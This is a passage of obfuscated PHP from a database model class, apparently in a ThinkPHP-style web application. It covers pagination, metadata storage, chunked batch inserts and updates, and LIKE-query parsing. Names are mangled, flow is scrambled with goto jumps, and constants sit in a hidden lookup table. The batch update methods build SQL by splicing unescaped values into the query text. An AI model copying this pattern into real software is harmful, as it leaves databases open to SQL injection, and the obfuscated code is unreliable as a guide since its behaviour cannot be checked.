$aàìù‹Œ) { $c÷ç¿²Â† =& $_SERVER[›é¼±]; return get_class($this) . $c÷ç¿²Â†[71] . $bÚˆ§ğªò” . $c÷ç¿²Â†[359] . $aàìù‹Œ; } protected function selectPageReset() { $b¡¦ğÖ×Ã =& $_SERVER[›é¼±]; if (isset($GLOBALS[$b¡¦ğÖ×Ã[360]])) { return; } $GLOBALS[$b¡¦ğÖ×Ã[360]] = isset($GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[361]]) ? $GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[361]] : !1; $GLOBALS[$b¡¦ğÖ×Ã[362]] = isset($GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[351]]) ? $GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[351]] : !1; $GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[361]] = !1; $GLOBALS[$b¡¦ğÖ×Ã[7]][$b¡¦ğÖ×Ã[351]] = !1; } protected function selectPageRestore() { $B”Ã®Ë»õÚ =& $_SERVER[›é¼±]; if (!isset($GLOBALS[$B”Ã®Ë»õÚ[360]])) { return; } $GLOBALS[$B”Ã®Ë»õÚ[7]][$B”Ã®Ë»õÚ[361]] = $GLOBALS[$B”Ã®Ë»õÚ[360]]; $GLOBALS[$B”Ã®Ë»õÚ[7]][$B”Ã®Ë»õÚ[351]] = $GLOBALS[$B”Ã®Ë»õÚ[362]]; unset($GLOBALS[$B”Ã®Ë»õÚ[360]]); unset($GLOBALS[$B”Ã®Ë»õÚ[362]]); } protected function selectPage($c­İœ‰Æª = 200, $EÑÆªµãš = 1) { goto c˜ÄŸºù›Å; cŠ»­ŞŠá‹: $Døáà§‡õÚ = 50000; $c­İœ‰Æª = isset($in[$e´§¨„‰åã[361]]) && $in[$e´§¨„‰åã[361]] ? $in[$e´§¨„‰åã[361]] : $c­İœ‰Æª; if ($c­İœ‰Æª === -1) { $in[$e´§¨„‰åã[361]] = !1; $Døáà§‡õÚ = 100000000; $c­İœ‰Æª = $Døáà§‡õÚ; } goto f‰³¸Æ¯Â; eİô†ùì²‚: $dêŞºÒìªù = array(); $eÈ×Ú†ö›¯ = 1; if ($EÑÆªµãš == 1 && $eÈ×Ú†ö›¯) { $this->optionsValue($c“Ú¼˜˜¥é); $dêŞºÒìªù = $this->page($EÑÆªµãš, $c­İœ‰Æª)->select(); $aÆÎÉÈİî  = is_array($dêŞºÒìªù) ? count($dêŞºÒìªù) : 0; if ($aÆÎÉÈİî  < $c­İœ‰Æª) { $C“¢œÌÓË = 1; } else { $this->optionsValue($E‰¶Œ¬¿£’); $aÆÎÉÈİî  = intval($this->count()); $C“¢œÌÓË = ceil($aÆÎÉÈİî  / $c­İœ‰Æª); } } else { $this->optionsValue($E‰¶Œ¬¿£’); $aÆÎÉÈİî  = intval($this->count()); $C“¢œÌÓË = ceil($aÆÎÉÈİî  / $c­İœ‰Æª); $EÑÆªµãš = $EÑÆªµãš >= $C“¢œÌÓË ? $C“¢œÌÓË : $EÑÆªµãš; $this->optionsValue($c“Ú¼˜˜¥é); $dêŞºÒìªù = $this->page($EÑÆªµãš, $c­İœ‰Æª)->select(); } goto EŸŒ×õß¥; c˜ÄŸºù›Å: $e´§¨„‰åã =& $_SERVER[›é¼±]; global $in; $c“Ú¼˜˜¥é = $this->optionsValue(); goto cŠ»­ŞŠá‹; EŸŒ×õß¥: if (!is_array($dêŞºÒìªù)) { $dêŞºÒìªù = array(); } if ($C“¢œÌÓË == 1) { $aÆÎÉÈİî  = count($dêŞºÒìªù); } $fŞ´šËŞÖ = array($e´§¨„‰åã[364] => array($e´§¨„‰åã[365] => $aÆÎÉÈİî , $e´§¨„‰åã[361] => $c­İœ‰Æª, $e´§¨„‰åã[351] => $EÑÆªµãš, $e´§¨„‰åã[366] => $C“¢œÌÓË), $e´§¨„‰åã[367] => $dêŞºÒìªù); goto Eóì÷Ş™¢; b«¼Ùš‡‚Å: $c­İœ‰Æª = $c­İœ‰Æª <= 5 ? 5 : ($c­İœ‰Æª >= $Døáà§‡õÚ ? $Døáà§‡õÚ : $c­İœ‰Æª); $EÑÆªµãš = intval(isset($in[$e´§¨„‰åã[351]]) && $in[$e´§¨„‰åã[351]] ? $in[$e´§¨„‰åã[351]] : $EÑÆªµãš); $EÑÆªµãš = $EÑÆªµãš <= 1 ? 1 : $EÑÆªµãš; goto eİô†ùì²‚; f‰³¸Æ¯Â: $E‰¶Œ¬¿£’ = $c“Ú¼˜˜¥é; $E‰¶Œ¬¿£’[$e´§¨„‰åã[363]] = array(); $c­İœ‰Æª = intval($c­İœ‰Æª); goto b«¼Ùš‡‚Å; Eóì÷Ş™¢: return $fŞ´šËŞÖ; goto a©Äõ£Óå; a©Äõ£Óå: } protected function checkLength($aŒÜÙ¼™„‘, $B‡®Ìóãë— = 0, $b…‰×ß ‘İ = '') { $e†¶”ù°  =& $_SERVER[›é¼±]; $B‡®Ìóãë— = $B‡®Ìóãë— ? $B‡®Ìóãë— : 65536; if (!$aŒÜÙ¼™„‘ || strlen($aŒÜÙ¼™„‘) < $B‡®Ìóãë—) { return; } $b…‰×ß ‘İ = $b…‰×ß ‘İ ? $b…‰×ß ‘İ . $e†¶”ù° [68] : $e†¶”ù° [33]; show_json($b…‰×ß ‘İ . LNG($e†¶”ù° [368]) . "\50{$B‡®Ìóãë—}\51", !1); } protected function metaSet($døÚ¬Á¡‡, $c‘ôÌ¶«Ø‡ = null, $fÆ²áÀ¢ = null) { goto Aóæ•ßË¸; A» •ä˜‚: $d£Òˆ…ÄÜŠ = $dó‚ËÉ†„[373] . $this->tableMeta; CacheLock::lock($d£Òˆ…ÄÜŠ); $BÓŸÆ½ñª‚->where(array($aŠ®ÔçÎêç => $døÚ¬Á¡‡))->addAll($A×ø´ÕÃ‰È, array(), !0); goto DœøÆùÊ¬; DœøÆùÊ¬: CacheLock::unlock($d£Òˆ…ÄÜŠ); return !0; goto d²£éÕ­…è; FŒ°Ì‡İó‚: if (is_string($c‘ôÌ¶«Ø‡)) { $F­®‘½ãÊõ[$c‘ôÌ¶«Ø‡] = $fÆ²áÀ¢; } $A×ø´ÕÃ‰È = array(); foreach ($F­®‘½ãÊõ as $D´°Ê‚µÀ => $eÏöÜãëÑì) { if (is_null($eÏöÜãëÑì) && is_string($D´°Ê‚µÀ)) { $BÓŸÆ½ñª‚->where(array($aŠ®ÔçÎêç => $døÚ¬Á¡‡, $dó‚ËÉ†„[371] => $D´°Ê‚µÀ))->delete(); continue; } $this->checkLength($eÏöÜãëÑì, !1, $C¹‡Ô¼İƒ . $dó‚ËÉ†„[4] . $D´°Ê‚µÀ); $A×ø´ÕÃ‰È[] = array($aŠ®ÔçÎêç => $døÚ¬Á¡‡, $dó‚ËÉ†„[93] => $D´°Ê‚µÀ, $dó‚ËÉ†„[372] => $eÏöÜãëÑì); } goto A» •ä˜‚; f„ä¯Š™: $C¹‡Ô¼İƒ = $this->tableMeta[$dó‚ËÉ†„[370]]; $BÓŸÆ½ñª‚ = Model($C¹‡Ô¼İƒ); $AÆëî‰Òî = array($aŠ®ÔçÎêç => $døÚ¬Á¡‡, $dó‚ËÉ†„[371] => $c‘ôÌ¶«Ø‡); goto C†®»ŞÛº¸; Aóæ•ßË¸: $dó‚ËÉ†„ =& $_SERVER[›é¼±]; if (!$this->tableMeta || !$døÚ¬Á¡‡) { return !1; } $aŠ®ÔçÎêç = $this->tableMeta[$dó‚ËÉ†„[369]]; goto f„ä¯Š™; C†®»ŞÛº¸: if (is_null($c‘ôÌ¶«Ø‡)) { return $BÓŸÆ½ñª‚->where(array($aŠ®ÔçÎêç => $døÚ¬Á¡‡))->delete(); } if (is_null($fÆ²áÀ¢) && is_string($c‘ôÌ¶«Ø‡)) { return $BÓŸÆ½ñª‚->where($AÆëî‰Òî)->delete(); } $F­®‘½ãÊõ = is_array($c‘ôÌ¶«Ø‡) ? $c‘ôÌ¶«Ø‡ : array(); goto FŒ°Ì‡İó‚; d²£éÕ­…è: } public function metaGet($Aí²–Â¨Ğ, $c¯±ãÄø‰¿ = false) { goto cå²Á¥İ˜¯; cå²Á¥İ˜¯: $e­ö¹ê¸ŞÄ =& $_SERVER[›é¼±]; if (!$this->tableMeta) { return array(); } $CĞ¬ª¸—ŞÎ = $this->tableMeta[$e­ö¹ê¸ŞÄ[369]]; goto f­áâê³·¼; Dê×«Æ†¤: $aÛĞù”¡»Ä = $Eˆ—Âõó„™->field($e­ö¹ê¸ŞÄ[374])->where($eÅõàŠ®Å)->select(); $aÛĞù”¡»Ä = array_to_keyvalue($aÛĞù”¡»Ä, $e­ö¹ê¸ŞÄ[93], $e­ö¹ê¸ŞÄ[372]); return $aÛĞù”¡»Ä; goto aƒ‡èœ»„Ü; f­áâê³·¼: $Eˆ—Âõó„™ = Model($this->tableMeta[$e­ö¹ê¸ŞÄ[370]]); if ($c¯±ãÄø‰¿) { $eÅõàŠ®Å = array($CĞ¬ª¸—ŞÎ => $Aí²–Â¨Ğ, $e­ö¹ê¸ŞÄ[93] => $c¯±ãÄø‰¿); return $Eˆ—Âõó„™->where($eÅõàŠ®Å)->getField($e­ö¹ê¸ŞÄ[372]); } $eÅõàŠ®Å = array($CĞ¬ª¸—ŞÎ => $Aí²–Â¨Ğ); goto Dê×«Æ†¤; aƒ‡èœ»„Ü: } private function checkDataAutoHas($fÍñê¿›‰â) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e’²„™) { if (in_array($fÍñê¿›‰â, explode($_SERVER[›é¼±][47], $e’²„™[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eÒ…Æø—Àœ, $BƒÚËÍœ¢) { $bÛÙÙËÒî =& $_SERVER[›é¼±]; foreach ($this->dataAuto as $e‘”Â½İŠ) { $d–®²èµÂ´ = $e‘”Â½İŠ[0]; if (!in_array($BƒÚËÍœ¢, explode($bÛÙÙËÒî[47], $e‘”Â½İŠ[2]))) { continue; } switch (trim($e‘”Â½İŠ[3])) { case $bÛÙÙËÒî[319]: case $bÛÙÙËÒî[320]: $Aïãˆ—¿Œ» = $e‘”Â½İŠ[1]; $Cİ‘ğœÈ¶´ = isset($e‘”Â½İŠ[4]) ? (array) $e‘”Â½İŠ[4] : array(); if ($Aïãˆ—¿Œ» == $bÛÙÙËÒî[197] && array_key_exists($d–®²èµÂ´, $eÒ…Æø—Àœ)) { if (!$eÒ…Æø—Àœ[$d–®²èµÂ´]) { unset($eÒ…Æø—Àœ[$d–®²èµÂ´]); } break; } if (isset($eÒ…Æø—Àœ[$d–®²èµÂ´])) { array_unshift($Cİ‘ğœÈ¶´, $eÒ…Æø—Àœ[$d–®²èµÂ´]); } if ($bÛÙÙËÒî[319] == $e‘”Â½İŠ[3]) { $eÒ…Æø—Àœ[$d–®²èµÂ´] = call_user_func_array($Aïãˆ—¿Œ», $Cİ‘ğœÈ¶´); } else { $eÒ…Æø—Àœ[$d–®²èµÂ´] = call_user_func_array(array(&$this, $Aïãˆ—¿Œ»), $Cİ‘ğœÈ¶´); } break; case $bÛÙÙËÒî[268]: if (isset($eÒ…Æø—Àœ[$d–®²èµÂ´]) && $eÒ…Æø—Àœ[$d–®²èµÂ´]) { $eÒ…Æø—Àœ[$d–®²èµÂ´] = call_user_func_array(array(&$this, $e‘”Â½İŠ[1]), array($eÒ…Æø—Àœ[$d–®²èµÂ´])); } break; case $bÛÙÙËÒî[271]: $eÒ…Æø—Àœ[$d–®²èµÂ´] = $eÒ…Æø—Àœ[$e‘”Â½İŠ[1]]; break; case $bÛÙÙËÒî[292]: if (isset($eÒ…Æø—Àœ[$d–®²èµÂ´]) && !is_string($eÒ…Æø—Àœ[$d–®²èµÂ´])) { $eÒ…Æø—Àœ[$d–®²èµÂ´] = json_encode_force($eÒ…Æø—Àœ[$d–®²èµÂ´]); } break; case $bÛÙÙËÒî[321]: if ($eÒ…Æø—Àœ[$d–®²èµÂ´] === $bÛÙÙËÒî[33]) { unset($eÒ…Æø—Àœ[$d–®²èµÂ´]); } break; case $bÛÙÙËÒî[322]: $eÒ…Æø—Àœ[$d–®²èµÂ´] = $e‘”Â½İŠ[1]; default: break; } } if ($BƒÚËÍœ¢ == $bÛÙÙËÒî[353]) { $Fß÷‘‚Ÿ±™ = strtolower($this->db->getDbType()); if (strpos($Fß÷‘‚Ÿ±™, $bÛÙÙËÒî[9]) !== 0) { return; } $FĞ«íêµ¬ç = $this->field(!0)->fields; $cÕŠ‡ Î´¶ = $FĞ«íêµ¬ç[$bÛÙÙËÒî[250]]; if (isset($FĞ«íêµ¬ç[$bÛÙÙËÒî[249]])) { unset($cÕŠ‡ Î´¶[$FĞ«íêµ¬ç[$bÛÙÙËÒî[249]]]); } foreach ($cÕŠ‡ Î´¶ as $dÎØå®óˆ => $BƒÚËÍœ¢) { if (!isset($eÒ…Æø—Àœ[$dÎØå®óˆ])) { $eÒ…Æø—Àœ[$dÎØå®óˆ] = $bÛÙÙËÒî[33]; } } } } private function dataAfterFilter(&$a„®ÖØ¾³Ç) { $C¿¥Õœ¨«¨ =& $_SERVER[›é¼±]; foreach ($this->dataAuto as $dà±ÉØÍŒˆ) { $fğ©«Ş©ÙÑ = $dà±ÉØÍŒˆ[0]; if (!isset($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ])) { continue; } if (!in_array($C¿¥Õœ¨«¨[355], explode($C¿¥Õœ¨«¨[47], $dà±ÉØÍŒˆ[2]))) { continue; } switch (trim($dà±ÉØÍŒˆ[3])) { case $C¿¥Õœ¨«¨[319]: case $C¿¥Õœ¨«¨[320]: $dÓÑéãô¡ø = isset($dà±ÉØÍŒˆ[4]) ? (array) $dà±ÉØÍŒˆ[4] : array(); array_unshift($dÓÑéãô¡ø, $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]); if (isset($dà±ÉØÍŒˆ[4]) && $dà±ÉØÍŒˆ[4] == $C¿¥Õœ¨«¨[375]) { $dÓÑéãô¡ø = array($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]); } if ($C¿¥Õœ¨«¨[319] == $dà±ÉØÍŒˆ[3]) { $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = call_user_func_array($dà±ÉØÍŒˆ[1], $dÓÑéãô¡ø); } else { $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = call_user_func_array(array(&$this, $dà±ÉØÍŒˆ[1]), $dÓÑéãô¡ø); } break; case $C¿¥Õœ¨«¨[268]: if (isset($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]) && $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]) { $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = call_user_func_array(array(&$this, $dà±ÉØÍŒˆ[1]), array($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ])); } break; case $C¿¥Õœ¨«¨[271]: $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = $a„®ÖØ¾³Ç[$dà±ÉØÍŒˆ[1]]; break; case $C¿¥Õœ¨«¨[292]: $Bº™Æ‚öƒ = $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]; $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = json_decode($Bº™Æ‚öƒ, !0); if (is_null($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ])) { $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = $Bº™Æ‚öƒ; } break; case $C¿¥Õœ¨«¨[321]: if ($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] === $C¿¥Õœ¨«¨[33]) { unset($a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ]); } break; case $C¿¥Õœ¨«¨[322]: $a„®ÖØ¾³Ç[$fğ©«Ş©ÙÑ] = $dà±ÉØÍŒˆ[1]; break; default: break; } } } public function saveAll($DÒåè¤–¶á) { goto C àˆÑÖî; bª¾óºßÓ†: $B÷Ú¼Œ = array(); $b‘Î×³­‹ = count($DÒåè¤–¶á); for ($b—„±ˆß = 0; $b—„±ˆß < $b‘Î×³­‹; $b—„±ˆß++) { $A§ ³ƒóŸ = $DÒåè¤–¶á[$b—„±ˆß]; if (!is_array($A§ ³ƒóŸ) || count($A§ ³ƒóŸ) != 4) { continue; } $A…ÜğŒéÌ = "\x55\x50\x44\101\x54\105\x20\140{$AŸ§™ößÂó}\x60\x20\x53\105\124\x20{$A§ ³ƒóŸ[2]}\40\x3d\40\x43\x41\123\105\x20{$A§ ³ƒóŸ[0]}\x20\12"; if ($b‚ñã˜“í· == 0) { $Eê©õ³Öš‘ = $A…ÜğŒéÌ; } $B÷Ú¼Œ[] = $c¿¦Ûæ‘Ò‘[116] . $A§ ³ƒóŸ[1] . $c¿¦Ûæ‘Ò‘[116]; $b‚ñã˜“í·++; $Eê©õ³Öš‘ .= "\x20\127\110\105\x4e\x20\47{$A§ ³ƒóŸ[1]}\x27\x20\124\110\x45\x4e\40\47{$A§ ³ƒóŸ[3]}\47\x20\xa"; if ($b‚ñã˜“í· == $b§¡¹„Ø¹£ || $b—„±ˆß == $b‘Î×³­‹ - 1) { goto fÅ‰·Ë’Šœ; bª©¦ÜÓö: $B÷Ú¼Œ = array(); goto C‘ø¾ÃË— ; fÅ‰·Ë’Šœ: $BîÁĞ°µ„Û = implode($c¿¦Ûæ‘Ò‘[47], $B÷Ú¼Œ); $Eê©õ³Öš‘ .= "\40\x45\116\x44\x20\40\127\110\105\x52\105\40{$A§ ³ƒóŸ[0]}\x20\111\116\x20\x28{$BîÁĞ°µ„Û}\x29\x20"; $this->execute($Eê©õ³Öš‘); goto fÛÁˆÌ×¯¯; fÛÁˆÌ×¯¯: $b‚ñã˜“í· = 0; $Eê©õ³Öš‘ = $A…ÜğŒéÌ; $this->chunkEventCheck(count($B÷Ú¼Œ)); goto bª©¦ÜÓö; C‘ø¾ÃË— : } } goto d¾ö°Ñ¨„‹; eô·Âî›î„: $DÒåè¤–¶á = is_array($DÒåè¤–¶á) ? $DÒåè¤–¶á : array(); $Eê©õ³Öš‘ = $c¿¦Ûæ‘Ò‘[376]; $b‚ñã˜“í· = 0; goto bª¾óºßÓ†; d¾ö°Ñ¨„‹: $this->chunkEventSet(); goto aÊï¨İÀˆ¡; C àˆÑÖî: $c¿¦Ûæ‘Ò‘ =& $_SERVER[›é¼±]; $AŸ§™ößÂó = $this->tablePrefix . $this->tableName; $b§¡¹„Ø¹£ = self::SQL_WHERE_IN_CHUNK; goto eô·Âî›î„; aÊï¨İÀˆ¡: } public function saveAllEach($fÔ…Ê–®Â–) { $b®¢¥©å—½ =& $_SERVER[›é¼±]; $càç¿Å­¾Î = $this->tablePrefix . $this->tableName; foreach ($fÔ…Ê–®Â– as $eØ¾‡„¸İß) { if (!is_array($eØ¾‡„¸İß) || count($eØ¾‡„¸İß) != 4) { continue; } $Cˆ˜ŠÔáß = $eØ¾‡„¸İß[0] . $b®¢¥©å—½[377] . $eØ¾‡„¸İß[1] . $b®¢¥©å—½[116]; $BµÙéÌÃ–– = $eØ¾‡„¸İß[2] . $b®¢¥©å—½[377] . $eØ¾‡„¸İß[3] . $b®¢¥©å—½[116]; $e§¼êÔ˜ÖÌ = "\x75\160\144\x61\164\x65\40{$càç¿Å­¾Î}\40\163\145\164\40{$BµÙéÌÃ––}\40\167\150\x65\x72\145\40{$Cˆ˜ŠÔáß}\73"; $this->execute($e§¼êÔ˜ÖÌ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aæğç‹¨Ğê = false, $cšÉõáá = false) { $this->_chunkEvent = $aæğç‹¨Ğê; $this->_chunkEventParam = $cšÉõáá; } private function chunkEventCheck($bÏ°…Ğ¡Ş“) { if (!$this->_chunkEvent) { return; } $Eù¬Ğ¡ƒ¾… = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Eù¬Ğ¡ƒ¾…[$_SERVER[›é¼±][378]] = $bÏ°…Ğ¡Ş“; Hook::trigger($this->_chunkEvent, $Eù¬Ğ¡ƒ¾…); } public function addAll($B¬„ÚÜŒ£, $FÄ†çÛ¡ìñ = array(), $cÄÌ“÷ô = false) { goto bÊ§ÏÈàÅÍ; bÊ§ÏÈàÅÍ: $DÌ…ã¯‡±® =& $_SERVER[›é¼±]; ignore_timeout(); $d¥ë“ÅÆ¨ì = self::SQL_WHERE_IN_CHUNK; goto f‚âëÛ¢; f‚âëÛ¢: if (empty($B¬„ÚÜŒ£)) { $this->error = think_lang($DÌ…ã¯‡±®[269]); return !1; } $FÄ†çÛ¡ìñ = $this->_parseOptions($FÄ†çÛ¡ìñ); foreach ($B¬„ÚÜŒ£ as $D¦Ã—œâÓó => $cø…Ñº£¬“) { $B¬„ÚÜŒ£[$D¦Ã—œâÓó] = $this->_facade($cø…Ñº£¬“); $this->_beforeInsert($B¬„ÚÜŒ£[$D¦Ã—œâÓó], $FÄ†çÛ¡ìñ); } goto aÊèçˆ İº; aÊèçˆ İº: if (method_exists($this->db, $DÌ…ã¯‡±®[270])) { for ($DÊ…Ğ„²Î˜ = 0; $DÊ…Ğ„²Î˜ < count($B¬„ÚÜŒ£); $DÊ…Ğ„²Î˜ += $d¥ë“ÅÆ¨ì) { $AµÕÕÜ¢ = array_slice($B¬„ÚÜŒ£, $DÊ…Ğ„²Î˜, $d¥ë“ÅÆ¨ì); if (!is_array($AµÕÕÜ¢) || count($AµÕÕÜ¢) == 0) { break; } $c§á˜…†‘— = $this->db->insertAll($AµÕÕÜ¢, $FÄ†çÛ¡ìñ, $cÄÌ“÷ô); $this->chunkEventCheck(count($AµÕÕÜ¢)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($B¬„ÚÜŒ£ as $D¦Ã—œâÓó => $cø…Ñº£¬“) { $c§á˜…†‘— = $this->db->insert($cø…Ñº£¬“, $FÄ†çÛ¡ìñ, $cÄÌ“÷ô); } $this->commit(); } if (!1 !== $c§á˜…†‘—) { $DÂ¹í»¸ùÚ = $this->getLastInsID(); if ($DÂ¹í»¸ùÚ) { return $DÂ¹í»¸ùÚ; } } return $c§á˜…†‘—; goto EØğ¾½Ş; EØğ¾½Ş: } public function save($FèŠØˆ¿Š£ = '', $E‚³÷˜ÔÅ’ = array()) { goto C¨‹ÇÎáñŠ; EéÇòƒßÖæ: for ($dÁ„Ä£ºŞÊ = 0; $dÁ„Ä£ºŞÊ < $AŠ½Ù™‚Ì‚; $dÁ„Ä£ºŞÊ += $C×Œ¬ÒŒ±Ù) { $CŞôíß“ˆ = array_slice($d£¯ãÂå«ß, $dÁ„Ä£ºŞÊ, $C×Œ¬ÒŒ±Ù); if (!is_array($CŞôíß“ˆ) || count($CŞôíß“ˆ) == 0) { break; } $eŒ‘Ìº¶„Ú[$EŒ‹É¡¥î[273]][$FøçÉº×ö][1] = $CŞôíß“ˆ; $this->optionsValue($eŒ‘Ìº¶„Ú); $B´ö¶ñôÊˆ += parent::save($FèŠØˆ¿Š£, $E‚³÷˜ÔÅ’); $this->chunkEventCheck(count($CŞôíß“ˆ)); } $this->chunkEventSet(); return $B´ö¶ñôÊˆ; goto A’Ï„ãÄ¿Ì; B‘—Åñ²¼: $FøçÉº×ö = $this->findWhereField($eŒ‘Ìº¶„Ú); if (!$FøçÉº×ö) { return parent::save($FèŠØˆ¿Š£, $E‚³÷˜ÔÅ’); } $B´ö¶ñôÊˆ = 0; goto D¹å¥‡ãÇ; C¨‹ÇÎáñŠ: $EŒ‹É¡¥î =& $_SERVER[›é¼±]; $C×Œ¬ÒŒ±Ù = self::SQL_WHERE_IN_CHUNK; $eŒ‘Ìº¶„Ú = $this->optionsValue(); goto B‘—Åñ²¼; D¹å¥‡ãÇ: $d£¯ãÂå«ß = $eŒ‘Ìº¶„Ú[$EŒ‹É¡¥î[273]][$FøçÉº×ö][1]; $d£¯ãÂå«ß = is_array($d£¯ãÂå«ß) ? $d£¯ãÂå«ß : array(); $AŠ½Ù™‚Ì‚ = count($d£¯ãÂå«ß); goto EéÇòƒßÖæ; A’Ï„ãÄ¿Ì: } public function add($F÷Í²Î·Çé = '', $Fëœ†¿ºÚÂ = array(), $b÷âÒË¿ÜÖ = false) { if ($this->addTaskStatus && is_array($F÷Í²Î·Çé)) { $this->addTaskData[] = $F÷Í²Î·Çé; return; } return parent::add($F÷Í²Î·Çé, $Fëœ†¿ºÚÂ, $b÷âÒË¿ÜÖ); } public function parseWhereLike($Bñİ ê¢ÙÓ, $dğË„„†š× = '', $bäãÍ™›È = false, &$bã²‰ÌøÒ¼ = false) { goto Fµ›¤šÑ—; CßĞĞïÜ”å: if (!is_array($Bñİ ê¢ÙÓ)) { return $Bñİ ê¢ÙÓ; } $e¾‡å†‡ˆÁ = array(); $fÄœØ¬¦ = 0; goto e£é‡ÜŸ; e£é‡ÜŸ: foreach ($Bñİ ê¢ÙÓ as $A’‹¶ÏŠİÄ => $E Î¡Õ¾îì) { if (is_array($E Î¡Õ¾îì) && count($E Î¡Õ¾îì) == 2 && $E Î¡Õ¾îì[0] == $DÖö¨¤‹Ä[381] && is_string($E Î¡Õ¾îì[1]) && substr($E Î¡Õ¾îì[1], 0, 1) == $DÖö¨¤‹Ä[382] && substr($E Î¡Õ¾îì[1], strlen($E Î¡Õ¾îì[1]) - 1, 1) == $DÖö¨¤‹Ä[382]) { goto aÙáš›³è; Dš¡¸ñ«²°: $e¾°”ù†¤ = $this->db->escapeString($e¾°”ù†¤); if (!strpos($d¾Ÿ©Š¹«Ó, $DÖö¨¤‹Ä[95])) { $d¾Ÿ©Š¹«Ó = $DÖö¨¤‹Ä[383] . $d¾Ÿ©Š¹«Ó . $DÖö¨¤‹Ä[383]; } $bªå…ğíàç = $DÖö¨¤‹Ä[182] . $e¾°”ù†¤ . $DÖö¨¤‹Ä[182]; goto fó×¹Õè––; fó×¹Õè––: if ($cÉ“¢º¡³µ[$DÖö¨¤‹Ä[384]]) { $bªå…ğíàç = $DÖö¨¤‹Ä[385] . $e¾°”ù†¤ . $DÖö¨¤‹Ä[386]; if ($cÉ“¢º¡³µ[$DÖö¨¤‹Ä[387]]) { $bªå…ğíàç = $DÖö¨¤‹Ä[386] . $e¾°”ù†¤ . $DÖö¨¤‹Ä[385]; } } $e¾‡å†‡ˆÁ[$fÄœØ¬¦] = $DÖö¨¤‹Ä[388] . $d¾Ÿ©Š¹«Ó . $DÖö¨¤‹Ä[389] . $bªå…ğíàç . $DÖö¨¤‹Ä[390]; $fÄœØ¬¦++; goto DóŞ·˜ÑÙ; aÙáš›³è: $bã²‰ÌøÒ¼ = !0; $d¾Ÿ©Š¹«Ó = is_string($A’‹¶ÏŠİÄ) ? $A’‹¶ÏŠİÄ : $dğË„„†š×; $e¾°”ù†¤ = substr($E Î¡Õ¾îì[1], 1, strlen($E Î¡Õ¾îì[1]) - 2); goto Dš¡¸ñ«²°; DóŞ·˜ÑÙ: continue; goto f‰‹èí²¹; f‰‹èí²¹: } if (is_array($E Î¡Õ¾îì)) { $dğË„„†š× = is_string($A’‹¶ÏŠİÄ) ? $A’‹¶ÏŠİÄ : $dğË„„†š×; $E Î¡Õ¾îì = $this->parseWhereLike($E Î¡Õ¾îì, $dğË„„†š×, !0, $bã²‰ÌøÒ¼); } if (is_numeric($A’‹¶ÏŠİÄ)) { $e¾‡å†‡ˆÁ[$fÄœØ¬¦] = $E Î¡Õ¾îì; $fÄœØ¬¦++; } else { $e¾‡å†‡ˆÁ[$A’‹¶ÏŠİÄ] = $E Î¡Õ¾îì; } } if ($bã²‰ÌøÒ¼ && !$bäãÍ™›È) { } return $e¾‡å†‡ˆÁ; goto DÄˆô¦Ô‹; Fµ›¤šÑ—: $DÖö¨¤‹Ä =& $_SERVER[›é¼±]; $cÉ“¢º¡³µ = $GLOBALS[$DÖö¨¤‹Ä[6]][$DÖö¨¤‹Ä[379]]; if (!$cÉ“¢º¡³µ[$DÖö¨¤‹Ä[380]]) { return $Bñİ ê¢ÙÓ; } goto CßĞĞïÜ”å; DÄˆô¦Ô‹: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eÅƒÈòÄ±å = array()) { goto a­³•”â˜ù; CºŸ¾¿ñ­À: $FÛä¡‚àÚù = is_array($FÛä¡‚àÚù) ? $FÛä¡‚àÚù : array(); $E¡Çôì›ëê = null; for ($CøíéØæŠî = 0; $CøíéØæŠî < count($FÛä¡‚àÚù); $CøíéØæŠî += $bÛ£†íÓùÙ) { $fÈï¼«ñŠÏ = array_slice($FÛä¡‚àÚù, $CøíéØæŠî, $bÛ£†íÓùÙ); if (!is_array($fÈï¼«ñŠÏ) || count($fÈï¼«ñŠÏ) == 0) { break; } $AË¶²îºÀ[$bƒ—³Éò‘‚[273]][$a™ßë–‘‡Î][1] = $fÈï¼«ñŠÏ; $this->optionsValue($AË¶²îºÀ); $b³Ö¤Íø¨ = parent::select($eÅƒÈòÄ±å); if (!$b³Ö¤Íø¨) { continue; } $E¡Çôì›ëê = is_array($E¡Çôì›ëê) ? $E¡Çôì›ëê : array(); $E¡Çôì›ëê = array_merge($E¡Çôì›ëê, $b³Ö¤Íø¨); } goto fíÔ¯ßÑ; d“Ø‹åÎé: $a™ßë–‘‡Î = $this->findWhereField($AË¶²îºÀ); if (!$a™ßë–‘‡Î || isset($AË¶²îºÀ[$bƒ—³Éò‘‚[290]]) || isset($AË¶²îºÀ[$bƒ—³Éò‘‚[351]])) { return parent::select($eÅƒÈòÄ±å); } $FÛä¡‚àÚù 